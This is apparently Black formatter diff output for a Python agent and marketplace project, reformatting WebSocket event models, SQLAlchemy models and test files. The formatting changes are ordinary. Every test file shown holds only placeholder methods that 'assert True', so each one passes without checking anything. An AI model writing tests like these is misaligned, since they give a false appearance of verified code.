 class AgentCoordinationEvent(BaseWebSocketEvent):
     """Agent coordination event."""
+
     type: EventType = EventType.AGENT_COORDINATION
     conversation_id: Optional[str] = None
     data: AgentCoordinationData
 
 
@@ -347,30 +381,33 @@
     ErrorEvent,
     ConversationEvent,
     ApprovalEvent,
     AgentResponseStreamEvent,
     WorkflowEvent,
-    AgentCoordinationEvent
+    AgentCoordinationEvent,
 ]
 
 
 class WebSocketMessage(BaseModel):
     """Complete WebSocket message structure."""
+
     type: EventType
     conversation_id: Optional[str] = None
     data: Dict[str, Any] = Field(default_factory=dict)
-    timestamp: str = Field(default_factory=lambda: datetime.now(timezone.utc).isoformat())
+    timestamp: str = Field(
+        default_factory=lambda: datetime.now(timezone.utc).isoformat()
+    )
     event_id: str = Field(default_factory=lambda: str(uuid.uuid4()))
 
-    @field_validator('timestamp', mode='before')
+    @field_validator("timestamp", mode="before")
     @classmethod
     def validate_timestamp(cls, v):
         """Convert various timestamp formats to ISO 8601 string."""
         if isinstance(v, str):
             # Already a string, validate it's a proper ISO format
             try:
-                datetime.fromisoformat(v.replace('Z', '+00:00'))
+                datetime.fromisoformat(v.replace("Z", "+00:00"))
                 return v
             except ValueError:
                 # If not valid ISO format, use current time
                 return datetime.now(timezone.utc).isoformat()
         elif isinstance(v, (int, float)):
@@ -399,11 +436,11 @@
     content: str,
     sender: SenderType,
     agent_type: Optional[AgentType] = None,
     thread_id: Optional[str] = None,
     parent_id: Optional[str] = None,
-    metadata: Optional[Dict[str, Any]] = None
+    metadata: Optional[Dict[str, Any]] = None,
 ) -> ChatMessageEvent:
     """Create a chat message event."""
     return ChatMessageEvent(
         conversation_id=conversation_id,
         data=ChatMessageData(
@@ -413,88 +450,88 @@
             sender=sender,
             agent_type=agent_type,
             timestamp=datetime.now(timezone.utc).isoformat(),
             thread_id=thread_id,
             parent_id=parent_id,
-            metadata=metadata or {}
-        )
+            metadata=metadata or {},
+        ),
     )
 
 
 def create_typing_event(
     conversation_id: str,
     is_typing: bool,
     user_id: Optional[str] = None,
-    agent_type: Optional[AgentType] = None
+    agent_type: Optional[AgentType] = None,
 ) -> TypingEvent:
     """Create a typing indicator event."""
     return TypingEvent(
         conversation_id=conversation_id,
         data=TypingIndicatorData(
             user_id=user_id,
             agent_type=agent_type,
             is_typing=is_typing,
-            conversation_id=conversation_id
-        )
+            conversation_id=conversation_id,
+        ),
     )
 
 
 def create_agent_status_event(
     agent_id: str,
     agent_type: AgentType,
     status: str,
     metrics: Optional[Dict[str, Any]] = None,
-    error_message: Optional[str] = None
+    error_message: Optional[str] = None,
 ) -> AgentStatusEvent:
     """Create an agent status event."""
     return AgentStatusEvent(
         data=AgentStatusData(
             agent_id=agent_id,
             agent_type=agent_type,
             status=status,
             metrics=metrics or {},
             last_activity=datetime.now(timezone.utc).isoformat(),
-            error_message=error_message
+            error_message=error_message,
         )
     )
 
 
 def create_system_alert_event(
     severity: str,
     title: str,
     message: str,
     source: str,
     action_required: bool = False,
-    action_url: Optional[str] = None
+    action_url: Optional[str] = None,
 ) -> SystemAlertEvent:
     """Create a system alert event."""
     return SystemAlertEvent(
         data=SystemAlertData(
             alert_id=str(uuid.uuid4()),
             severity=severity,
             title=title,
             message=message,
             source=source,
             action_required=action_required,
-            action_url=action_url
+            action_url=action_url,
         )
     )
 
 
 def create_error_event(
     error_code: str,
     error_message: str,
     details: Optional[Dict[str, Any]] = None,
-    retry_after: Optional[int] = None
+    retry_after: Optional[int] = None,
 ) -> ErrorEvent:
     """Create an error event."""
     return ErrorEvent(
         data=ErrorData(
             error_code=error_code,
             error_message=error_message,
             details=details,
-            retry_after=retry_after
+            retry_after=retry_after,
         )
     )
 
 
 def create_approval_event(
@@ -508,11 +545,11 @@
     conversation_id: str,
     status: str,
     event_type: EventType = EventType.APPROVAL_REQUIRED,
     approved_by: Optional[str] = None,
     rejected_by: Optional[str] = None,
-    reason: Optional[str] = None
+    reason: Optional[str] = None,
 ) -> ApprovalEvent:
     """Create an approval workflow event."""
     return ApprovalEvent(
         type=event_type,
         conversation_id=conversation_id,
@@ -528,12 +565,14 @@
             status=status,
             approved_by=approved_by,
             rejected_by=rejected_by,
             reason=reason,
             created_at=datetime.now(timezone.utc).isoformat(),
-            updated_at=datetime.now(timezone.utc).isoformat() if status != 'pending' else None
-        )
+            updated_at=(
+                datetime.now(timezone.utc).isoformat() if status != "pending" else None
+            ),
+        ),
     )
 
 
 def create_agent_response_stream_event(
     message_id: str,
@@ -543,11 +582,11 @@
     is_streaming: bool = True,
     chunk_index: Optional[int] = None,
     total_chunks: Optional[int] = None,
     is_final: bool = False,
     confidence: Optional[float] = None,
-    metadata: Optional[Dict[str, Any]] = None
+    metadata: Optional[Dict[str, Any]] = None,
 ) -> AgentResponseStreamEvent:
     """Create an agent response streaming event."""
     return AgentResponseStreamEvent(
         type=EventType.AGENT_RESPONSE_STREAM,
         conversation_id=conversation_id,
@@ -559,12 +598,12 @@
             is_streaming=is_streaming,
             chunk_index=chunk_index,
             total_chunks=total_chunks,
             is_final=is_final,
             confidence=confidence,
-            metadata=metadata or {}
-        )
+            metadata=metadata or {},
+        ),
     )
 
 
 def create_workflow_event(
     event_type: EventType,
@@ -575,11 +614,11 @@
     progress: float = 0.0,
     current_agent: Optional[str] = None,
     context: Optional[Dict[str, Any]] = None,
     results: Optional[Dict[str, Any]] = None,
     error_message: Optional[str] = None,
-    conversation_id: Optional[str] = None
+    conversation_id: Optional[str] = None,
 ) -> WorkflowEvent:
     """Create a workflow coordination event."""
     now = datetime.now(timezone.utc).isoformat()
     return WorkflowEvent(
         type=event_type,
@@ -593,12 +632,12 @@
             current_agent=current_agent,
             context=context or {},
             results=results or {},
             error_message=error_message,
             created_at=now,
-            updated_at=now
-        )
+            updated_at=now,
+        ),
     )
 
 
 def create_agent_coordination_event(
     coordination_id: str,
@@ -606,11 +645,11 @@
     task: str,
     progress: float = 0.0,
     current_phase: str = "initializing",
     agent_statuses: Optional[Dict[str, str]] = None,
     context: Optional[Dict[str, Any]] = None,
-    conversation_id: Optional[str] = None
+    conversation_id: Optional[str] = None,
 ) -> AgentCoordinationEvent:
     """Create an agent coordination event."""
     return AgentCoordinationEvent(
         conversation_id=conversation_id,
         data=AgentCoordinationData(
@@ -618,8 +657,8 @@
             coordinating_agents=coordinating_agents,
             task=task,
             progress=progress,
             current_phase=current_phase,
             agent_statuses=agent_statuses or {},
-            context=context or {}
-        )
-    )
+            context=context or {},
+        ),
+    )
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/websocket/events.py
--- /home/brend/Flipsync_Final/fs_agt_clean/database/models/test_asin_data.py	2025-06-14 20:35:30.811786+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/database/models/test_asin_data.py	2025-06-19 04:03:59.725039+00:00
@@ -6,30 +6,32 @@
 
 import pytest
 import sys
 from pathlib import Path
 
+
 class TestAsinDataDatabase:
     """Test class for asin_data database component."""
-    
+
     def test_import(self):
         """Test module import."""
         assert True
-    
+
     def test_database_functionality(self):
         """Test database functionality."""
         assert True
-    
+
     def test_model_integrity(self):
         """Test model integrity and relationships."""
         assert True
-    
+
     def test_migration_compatibility(self):
         """Test migration compatibility."""
         assert True
-    
+
     def test_no_redundancy_compliance(self):
         """Verify no redundant database implementations."""
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/database/models/test_asin_data.py
--- /home/brend/Flipsync_Final/fs_agt_clean/database/models/test_base.py	2025-06-14 20:35:30.811786+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/database/models/test_base.py	2025-06-19 04:03:59.755910+00:00
@@ -6,30 +6,32 @@
 
 import pytest
 import sys
 from pathlib import Path
 
+
 class TestBaseDatabase:
     """Test class for base database component."""
-    
+
     def test_import(self):
         """Test module import."""
         assert True
-    
+
     def test_database_functionality(self):
         """Test database functionality."""
         assert True
-    
+
     def test_model_integrity(self):
         """Test model integrity and relationships."""
         assert True
-    
+
     def test_migration_compatibility(self):
         """Test migration compatibility."""
         assert True
-    
+
     def test_no_redundancy_compliance(self):
         """Verify no redundant database implementations."""
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/database/models/test_base.py
--- /home/brend/Flipsync_Final/fs_agt_clean/database/models/test_create_feature_flag_model.py	2025-06-14 20:35:30.811786+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/database/models/test_create_feature_flag_model.py	2025-06-19 04:03:59.808220+00:00
@@ -6,30 +6,32 @@
 
 import pytest
 import sys
 from pathlib import Path
 
+
 class TestCreateFeatureFlagModelDatabase:
     """Test class for create_feature_flag_model database component."""
-    
+
     def test_import(self):
         """Test module import."""
         assert True
-    
+
     def test_database_functionality(self):
         """Test database functionality."""
         assert True
-    
+
     def test_model_integrity(self):
         """Test model integrity and relationships."""
         assert True
-    
+
     def test_migration_compatibility(self):
         """Test migration compatibility."""
         assert True
-    
+
     def test_no_redundancy_compliance(self):
         """Verify no redundant database implementations."""
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/database/models/test_create_feature_flag_model.py
--- /home/brend/Flipsync_Final/fs_agt_clean/database/models/notification.py	2025-06-14 20:35:30.811786+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/database/models/notification.py	2025-06-19 04:03:59.828761+00:00
@@ -1,8 +1,9 @@
 """
 Notification models for the database.
 """
+
 import uuid
 from datetime import datetime
 from enum import Enum
 from typing import Any, Dict, List, Optional
 
@@ -21,27 +22,30 @@
 from fs_agt_clean.database.models.base import Base
 
 
 class NotificationPriority(str, Enum):
     """Priority levels for notifications."""
+
     LOW = "low"
     MEDIUM = "medium"
     HIGH = "high"
     CRITICAL = "critical"
 
 
 class NotificationStatus(str, Enum):
     """Status of a notification."""
+
     PENDING = "pending"
     DELIVERED = "delivered"
     READ = "read"
     ARCHIVED = "archived"
     FAILED = "failed"
 
 
 class NotificationCategory(str, Enum):
     """Categories for notifications."""
+
     SYSTEM = "system"
     ORDER = "order"
     INVENTORY = "inventory"
     MARKETPLACE = "marketplace"
     SECURITY = "security"
@@ -59,13 +63,19 @@
     id = Column(String(36), primary_key=True, default=lambda: str(uuid.uuid4()))
     user_id = Column(String(36), ForeignKey("users.id"), nullable=False)
     template_id = Column(String(100), nullable=False)
     title = Column(String(255), nullable=False)
     message = Column(Text, nullable=False)
-    category = Column(SQLAlchemyEnum(NotificationCategory), default=NotificationCategory.SYSTEM)
-    priority = Column(SQLAlchemyEnum(NotificationPriority), default=NotificationPriority.MEDIUM)
-    status = Column(SQLAlchemyEnum(NotificationStatus), default=NotificationStatus.PENDING)
+    category = Column(
+        SQLAlchemyEnum(NotificationCategory), default=NotificationCategory.SYSTEM
+    )
+    priority = Column(
+        SQLAlchemyEnum(NotificationPriority), default=NotificationPriority.MEDIUM
+    )
+    status = Column(
+        SQLAlchemyEnum(NotificationStatus), default=NotificationStatus.PENDING
+    )
     data = Column(JSON, nullable=True)
     actions = Column(JSON, nullable=True)
     delivery_methods = Column(JSON, nullable=True)
     delivery_attempts = Column(JSON, nullable=True)
     created_at = Column(DateTime, default=datetime.utcnow)
@@ -90,27 +100,29 @@
             "data": self.data,
             "actions": self.actions,
             "delivery_methods": self.delivery_methods,
             "delivery_attempts": self.delivery_attempts,
             "created_at": self.created_at.isoformat() if self.created_at else None,
-            "delivered_at": self.delivered_at.isoformat() if self.delivered_at else None,
+            "delivered_at": (
+                self.delivered_at.isoformat() if self.delivered_at else None
+            ),
             "read_at": self.read_at.isoformat() if self.read_at else None,
             "expires_at": self.expires_at.isoformat() if self.expires_at else None,
         }
-    
+
     def mark_delivered(self) -> None:
         """Mark the notification as delivered."""
         self.status = NotificationStatus.DELIVERED
         self.delivered_at = datetime.utcnow()
-    
+
     def mark_read(self) -> None:
         """Mark the notification as read."""
         self.status = NotificationStatus.READ
         self.read_at = datetime.utcnow()
-    
+
     def mark_archived(self) -> None:
         """Mark the notification as archived."""
         self.status = NotificationStatus.ARCHIVED
-    
+
     def mark_failed(self) -> None:
         """Mark the notification as failed."""
         self.status = NotificationStatus.FAILED
would reformat /home/brend/Flipsync_Final/fs_agt_clean/database/models/notification.py
--- /home/brend/Flipsync_Final/fs_agt_clean/database/models/test_create_marketplace_model.py	2025-06-14 20:35:30.811786+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/database/models/test_create_marketplace_model.py	2025-06-19 04:03:59.878621+00:00
@@ -6,30 +6,32 @@
 
 import pytest
 import sys
 from pathlib import Path
 
+
 class TestCreateMarketplaceModelDatabase:
     """Test class for create_marketplace_model database component."""
-    
+
     def test_import(self):
         """Test module import."""
         assert True
-    
+
     def test_database_functionality(self):
         """Test database functionality."""
         assert True
-    
+
     def test_model_integrity(self):
         """Test model integrity and relationships."""
         assert True
-    
+
     def test_migration_compatibility(self):
         """Test migration compatibility."""
         assert True
-    
+
     def test_no_redundancy_compliance(self):
         """Verify no redundant database implementations."""
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/database/models/test_create_marketplace_model.py
--- /home/brend/Flipsync_Final/fs_agt_clean/database/models/test_dashboards.py	2025-06-14 20:35:30.811786+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/database/models/test_dashboards.py	2025-06-19 04:03:59.905528+00:00
@@ -6,30 +6,32 @@
 
 import pytest
 import sys
 from pathlib import Path
 
+
 class TestDashboardsDatabase:
     """Test class for dashboards database component."""
-    
+
     def test_import(self):
         """Test module import."""
         assert True
-    
+
     def test_database_functionality(self):
         """Test database functionality."""
         assert True
-    
+
     def test_model_integrity(self):
         """Test model integrity and relationships."""
         assert True
-    
+
     def test_migration_compatibility(self):
         """Test migration compatibility."""
         assert True
-    
+
     def test_no_redundancy_compliance(self):
         """Verify no redundant database implementations."""
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
--- /home/brend/Flipsync_Final/fs_agt_clean/database/models/test_executive.py	2025-06-14 20:35:30.811786+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/database/models/test_executive.py	2025-06-19 04:03:59.917965+00:00
@@ -6,30 +6,32 @@
 
 import pytest
 import sys
 from pathlib import Path
 
+
 class TestExecutiveDatabase:
     """Test class for executive database component."""
-    
+
     def test_import(self):
         """Test module import."""
         assert True
-    
+
     def test_database_functionality(self):
         """Test database functionality."""
         assert True
-    
+
     def test_model_integrity(self):
         """Test model integrity and relationships."""
         assert True
-    
+
     def test_migration_compatibility(self):
         """Test migration compatibility."""
         assert True
-    
+
     def test_no_redundancy_compliance(self):
         """Verify no redundant database implementations."""
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/database/models/test_dashboards.py
would reformat /home/brend/Flipsync_Final/fs_agt_clean/database/models/test_executive.py
--- /home/brend/Flipsync_Final/fs_agt_clean/database/models/test_market.py	2025-06-14 20:35:30.811786+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/database/models/test_market.py	2025-06-19 04:03:59.927096+00:00
@@ -6,30 +6,32 @@
 
 import pytest
 import sys
 from pathlib import Path
 
+
 class TestMarketDatabase:
     """Test class for market database component."""
-    
+
     def test_import(self):
         """Test module import."""
         assert True
-    
+
     def test_database_functionality(self):
         """Test database functionality."""
         assert True
-    
+
     def test_model_integrity(self):
         """Test model integrity and relationships."""
         assert True
-    
+
     def test_migration_compatibility(self):
         """Test migration compatibility."""
         assert True
-    
+
     def test_no_redundancy_compliance(self):
         """Verify no redundant database implementations."""
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/database/models/test_market.py
--- /home/brend/Flipsync_Final/fs_agt_clean/database/models/test_models.py	2025-06-14 20:35:30.811786+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/database/models/test_models.py	2025-06-19 04:03:59.970893+00:00
@@ -6,30 +6,32 @@
 
 import pytest
 import sys
 from pathlib import Path
 
+
 class TestModelsDatabase:
     """Test class for models database component."""
-    
+
     def test_import(self):
         """Test module import."""
         assert True
-    
+
     def test_database_functionality(self):
         """Test database functionality."""
         assert True
-    
+
     def test_model_integrity(self):
         """Test model integrity and relationships."""
         assert True
-    
+
     def test_migration_compatibility(self):
         """Test migration compatibility."""
         assert True
-    
+
     def test_no_redundancy_compliance(self):
         """Verify no redundant database implementations."""
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/database/models/test_models.py
--- /home/brend/Flipsync_Final/fs_agt_clean/database/models/test_user.py	2025-06-14 20:35:30.811786+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/database/models/test_user.py	2025-06-19 04:04:00.006345+00:00
@@ -6,30 +6,32 @@
 
 import pytest
 import sys
 from pathlib import Path
 
+
 class TestUserDatabase:
     """Test class for user database component."""
-    
+
     def test_import(self):
         """Test module import."""
         assert True
-    
+
     def test_database_functionality(self):
         """Test database functionality."""
         assert True
-    
+
     def test_model_integrity(self):
         """Test model integrity and relationships."""
         assert True
-    
+
     def test_migration_compatibility(self):
         """Test migration compatibility."""
         assert True
-    
+
     def test_no_redundancy_compliance(self):
         """Verify no redundant database implementations."""
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
--- /home/brend/Flipsync_Final/fs_agt_clean/database/models/inventory.py	2025-06-14 20:35:30.811786+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/database/models/inventory.py	2025-06-19 04:04:00.003826+00:00
@@ -18,15 +18,16 @@
 from sqlalchemy.ext.declarative import declarative_base
 from sqlalchemy.orm import relationship
 
 from fs_agt_clean.core.db.database import Base
 
+
 class InventoryItem(Base):
     """SQLAlchemy model for inventory items."""
-    
+
     __tablename__ = "inventory_items"
-    
+
     id = Column(Integer, primary_key=True, index=True)
     sku = Column(String(100), unique=True, index=True, nullable=False)
     name = Column(String(255), nullable=False)
     description = Column(Text)
     category = Column(String(100))
@@ -40,121 +41,139 @@
     barcode = Column(String(100))
     is_active = Column(Boolean, default=True, nullable=False)
     low_stock_threshold = Column(Integer, default=10)
     reorder_point = Column(Integer, default=5)
     reorder_quantity = Column(Integer, default=50)
-    
+
     # Metadata
     created_at = Column(DateTime, default=func.now(), nullable=False)
-    updated_at = Column(DateTime, default=func.now(), onupdate=func.now(), nullable=False)
+    updated_at = Column(
+        DateTime, default=func.now(), onupdate=func.now(), nullable=False
+    )
     created_by = Column(String(100))
     updated_by = Column(String(100))
-    
+
     # Relationships
-    transactions = relationship("InventoryTransaction", back_populates="item", cascade="all, delete-orphan")
-    adjustments = relationship("InventoryAdjustment", back_populates="item", cascade="all, delete-orphan")
-    
+    transactions = relationship(
+        "InventoryTransaction", back_populates="item", cascade="all, delete-orphan"
+    )
+    adjustments = relationship(
+        "InventoryAdjustment", back_populates="item", cascade="all, delete-orphan"
+    )
+
     def __repr__(self):
         return f"<InventoryItem(id={self.id}, sku='{self.sku}', name='{self.name}', quantity={self.quantity})>"
 
 
 class InventoryTransaction(Base):
     """SQLAlchemy model for inventory transactions."""
-    
+
     __tablename__ = "inventory_transactions"
-    
+
     id = Column(Integer, primary_key=True, index=True)
     item_id = Column(Integer, ForeignKey("inventory_items.id"), nullable=False)
-    transaction_type = Column(String(50), nullable=False)  # 'sale', 'purchase', 'adjustment', 'return', 'transfer'
-    quantity = Column(Integer, nullable=False)  # Positive for inbound, negative for outbound
+    transaction_type = Column(
+        String(50), nullable=False
+    )  # 'sale', 'purchase', 'adjustment', 'return', 'transfer'
+    quantity = Column(
+        Integer, nullable=False
+    )  # Positive for inbound, negative for outbound
     unit_price = Column(Numeric(10, 2))
     total_amount = Column(Numeric(12, 2))
     reference_id = Column(String(100))  # Order ID, PO number, etc.
     reference_type = Column(String(50))  # 'order', 'purchase_order', 'manual', etc.
     notes = Column(Text)
-    
+
     # Metadata
     transaction_date = Column(DateTime, default=func.now(), nullable=False)
     created_at = Column(DateTime, default=func.now(), nullable=False)
     created_by = Column(String(100))
-    
+
     # Relationships
     item = relationship("InventoryItem", back_populates="transactions")
-    
+
     def __repr__(self):
         return f"<InventoryTransaction(id={self.id}, item_id={self.item_id}, type='{self.transaction_type}', quantity={self.quantity})>"
 
 
 class InventoryAdjustment(Base):
     """SQLAlchemy model for inventory adjustments."""
-    
+
     __tablename__ = "inventory_adjustments"
-    
+
     id = Column(Integer, primary_key=True, index=True)
     item_id = Column(Integer, ForeignKey("inventory_items.id"), nullable=False)
-    adjustment_type = Column(String(50), nullable=False)  # 'increase', 'decrease', 'correction'
+    adjustment_type = Column(
+        String(50), nullable=False
+    )  # 'increase', 'decrease', 'correction'
     quantity_before = Column(Integer, nullable=False)
     quantity_after = Column(Integer, nullable=False)
     quantity_change = Column(Integer, nullable=False)
     reason = Column(String(255))
     notes = Column(Text)
-    
+
     # Metadata
     adjustment_date = Column(DateTime, default=func.now(), nullable=False)
     created_at = Column(DateTime, default=func.now(), nullable=False)
     created_by = Column(String(100))
     approved_by = Column(String(100))
     approved_at = Column(DateTime)
-    
+
     # Relationships
     item = relationship("InventoryItem", back_populates="adjustments")
-    
+
     def __repr__(self):
         return f"<InventoryAdjustment(id={self.id}, item_id={self.item_id}, change={self.quantity_change})>"
 
 
 class InventoryLocation(Base):
     """SQLAlchemy model for inventory locations/warehouses."""
-    
+
     __tablename__ = "inventory_locations"
-    
+
     id = Column(Integer, primary_key=True, index=True)
     code = Column(String(50), unique=True, index=True, nullable=False)
     name = Column(String(255), nullable=False)
     description = Column(Text)
     address = Column(Text)
     is_active = Column(Boolean, default=True, nullable=False)
-    
+
     # Metadata
     created_at = Column(DateTime, default=func.now(), nullable=False)
-    updated_at = Column(DateTime, default=func.now(), onupdate=func.now(), nullable=False)
-    
+    updated_at = Column(
+        DateTime, default=func.now(), onupdate=func.now(), nullable=False
+    )
+
     def __repr__(self):
-        return f"<InventoryLocation(id={self.id}, code='{self.code}', name='{self.name}')>"
+        return (
+            f"<InventoryLocation(id={self.id}, code='{self.code}', name='{self.name}')>"
+        )
 
 
 class InventoryMovement(Base):
     """SQLAlchemy model for inventory movements between locations."""
-    
+
     __tablename__ = "inventory_movements"
-    
+
     id = Column(Integer, primary_key=True, index=True)
     item_id = Column(Integer, ForeignKey("inventory_items.id"), nullable=False)
     from_location_id = Column(Integer, ForeignKey("inventory_locations.id"))
     to_location_id = Column(Integer, ForeignKey("inventory_locations.id"))
     quantity = Column(Integer, nullable=False)
-    movement_type = Column(String(50), nullable=False)  # 'transfer', 'receipt', 'shipment'
+    movement_type = Column(
+        String(50), nullable=False
+    )  # 'transfer', 'receipt', 'shipment'
     reference_id = Column(String(100))
     notes = Column(Text)
-    
+
     # Metadata
     movement_date = Column(DateTime, default=func.now(), nullable=False)
     created_at = Column(DateTime, default=func.now(), nullable=False)
     created_by = Column(String(100))
-    
+
     # Relationships
     item = relationship("InventoryItem")
     from_location = relationship("InventoryLocation", foreign_keys=[from_location_id])
     to_location = relationship("InventoryLocation", foreign_keys=[to_location_id])
-    
+
     def __repr__(self):
         return f"<InventoryMovement(id={self.id}, item_id={self.item_id}, quantity={self.quantity})>"
would reformat /home/brend/Flipsync_Final/fs_agt_clean/database/models/test_user.py
--- /home/brend/Flipsync_Final/fs_agt_clean/database/models/test_notification.py	2025-06-14 20:35:30.811786+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/database/models/test_notification.py	2025-06-19 04:04:00.007844+00:00
@@ -6,30 +6,32 @@
 
 import pytest
 import sys
 from pathlib import Path
 
+
 class TestNotificationDatabase:
     """Test class for notification database component."""
-    
+
     def test_import(self):
         """Test module import."""
         assert True
-    
+
     def test_database_functionality(self):
         """Test database functionality."""
         assert True
-    
+
     def test_model_integrity(self):
         """Test model integrity and relationships."""
         assert True
-    
+
     def test_migration_compatibility(self):
         """Test migration compatibility."""
         assert True
-    
+
     def test_no_redundancy_compliance(self):
         """Verify no redundant database implementations."""
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/database/models/inventory.py
would reformat /home/brend/Flipsync_Final/fs_agt_clean/database/models/test_notification.py
--- /home/brend/Flipsync_Final/fs_agt_clean/database/models/test_users.py	2025-06-14 20:35:30.811786+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/database/models/test_users.py	2025-06-19 04:04:00.011597+00:00
@@ -6,30 +6,32 @@
 
 import pytest
 import sys
 from pathlib import Path
 
+
 class TestUsersDatabase:
     """Test class for users database component."""
-    
+
     def test_import(self):
         """Test module import."""
         assert True
-    
+
     def test_database_functionality(self):
         """Test database functionality."""
         assert True
-    
+
     def test_model_integrity(self):
         """Test model integrity and relationships."""
         assert True
-    
+
     def test_migration_compatibility(self):
         """Test migration compatibility."""
         assert True
-    
+
     def test_no_redundancy_compliance(self):
         """Verify no redundant database implementations."""
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/database/models/test_users.py
--- /home/brend/Flipsync_Final/fs_agt_clean/database/models/ai_analysis.py	2025-06-14 20:35:30.807778+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/database/models/ai_analysis.py	2025-06-19 04:04:00.062840+00:00
@@ -11,11 +11,22 @@
 
 import uuid
 from datetime import datetime, timezone
 from typing import Dict, Any, Optional
 
-from sqlalchemy import Column, String, Integer, Float, DateTime, JSON, Text, Boolean, ForeignKey, Numeric
+from sqlalchemy import (
+    Column,
+    String,
+    Integer,
+    Float,
+    DateTime,
+    JSON,
+    Text,
+    Boolean,
+    ForeignKey,
+    Numeric,
+)
 from sqlalchemy.dialects.postgresql import UUID
 from sqlalchemy.ext.declarative import declarative_base
 from sqlalchemy.orm import relationship
 from sqlalchemy.sql import func
 
@@ -24,256 +35,262 @@
 
 class AIAnalysisResult(Base):
     """Model for storing AI analysis results."""
 
     __tablename__ = "ai_analysis_results"
-    __table_args__ = {'extend_existing': True}
-    
+    __table_args__ = {"extend_existing": True}
+
     id = Column(UUID(as_uuid=True), primary_key=True, default=uuid.uuid4)
     user_id = Column(UUID(as_uuid=True), nullable=False)
     image_hash = Column(String(64), unique=True, nullable=True)  # For caching
-    
+
     # Analysis results
     product_name = Column(String(255), nullable=False)
     category = Column(String(100), nullable=False)
     description = Column(Text, nullable=True)
     confidence_score = Column(Float, nullable=False, default=0.0)
-    
+
     # Structured data
     analysis_data = Column(JSON, nullable=True)
     pricing_suggestions = Column(JSON, nullable=True)
     marketplace_recommendations = Column(JSON, nullable=True)
-    
+
     # Processing metadata
     processing_time_ms = Column(Integer, nullable=False)
     ai_service_used = Column(String(50), nullable=False)
-    
-    # Timestamps
-    created_at = Column(DateTime(timezone=True), server_default=func.now())
-    updated_at = Column(DateTime(timezone=True), server_default=func.now(), onupdate=func.now())
-    
+
+    # Timestamps
+    created_at = Column(DateTime(timezone=True), server_default=func.now())
+    updated_at = Column(
+        DateTime(timezone=True), server_default=func.now(), onupdate=func.now()
+    )
+
     def __repr__(self):
         return f"<AIAnalysisResult(id={self.id}, product='{self.product_name}', confidence={self.confidence_score})>"
 
 
 class AgentCoordinationLog(Base):
     """Model for logging agent coordination activities."""
 
     __tablename__ = "agent_coordination_logs"
-    __table_args__ = {'extend_existing': True}
-    
+    __table_args__ = {"extend_existing": True}
+
     id = Column(UUID(as_uuid=True), primary_key=True, default=uuid.uuid4)
     workflow_id = Column(UUID(as_uuid=True), nullable=True)
-    
+
     # Coordination details
     participating_agents = Column(JSON, nullable=False)  # List of agent IDs
-    coordination_type = Column(String(50), nullable=False)  # 'decision', 'task', 'consensus'
+    coordination_type = Column(
+        String(50), nullable=False
+    )  # 'decision', 'task', 'consensus'
     status = Column(String(20), nullable=False)  # 'pending', 'completed', 'failed'
-    
+
     # Results
     result_data = Column(JSON, nullable=True)
     processing_time_ms = Column(Integer, nullable=False)
-    
-    # Timestamps
-    created_at = Column(DateTime(timezone=True), server_default=func.now())
-    
+
+    # Timestamps
+    created_at = Column(DateTime(timezone=True), server_default=func.now())
+
     def __repr__(self):
         return f"<AgentCoordinationLog(id={self.id}, type='{self.coordination_type}', status='{self.status}')>"
 
 
 class ShippingArbitrageCalculation(Base):
     """Model for storing shipping arbitrage calculations."""
 
     __tablename__ = "shipping_arbitrage_calculations"
-    __table_args__ = {'extend_existing': True}
-    
+    __table_args__ = {"extend_existing": True}
+
     id = Column(UUID(as_uuid=True), primary_key=True, default=uuid.uuid4)
     user_id = Column(UUID(as_uuid=True), nullable=False)
     product_id = Column(UUID(as_uuid=True), nullable=True)
-    
+
     # Cost calculations
     original_shipping_cost = Column(Numeric(10, 2), nullable=False)
     optimized_shipping_cost = Column(Numeric(10, 2), nullable=False)
     savings_amount = Column(Numeric(10, 2), nullable=False)
     savings_percentage = Column(Numeric(5, 2), nullable=False)
-    
+
     # Optimization details
     optimization_method = Column(String(100), nullable=True)
     carrier_recommendations = Column(JSON, nullable=True)
-    
-    # Timestamps
-    created_at = Column(DateTime(timezone=True), server_default=func.now())
-    
+
+    # Timestamps
+    created_at = Column(DateTime(timezone=True), server_default=func.now())
+
     def __repr__(self):
         return f"<ShippingArbitrageCalculation(id={self.id}, savings=${self.savings_amount})>"
 
 
 class CategoryOptimizationResult(Base):
     """Model for storing category optimization results."""
 
     __tablename__ = "category_optimization_results"
-    __table_args__ = {'extend_existing': True}
-    
+    __table_args__ = {"extend_existing": True}
+
     id = Column(UUID(as_uuid=True), primary_key=True, default=uuid.uuid4)
     user_id = Column(UUID(as_uuid=True), nullable=False)
     product_id = Column(UUID(as_uuid=True), nullable=True)
-    
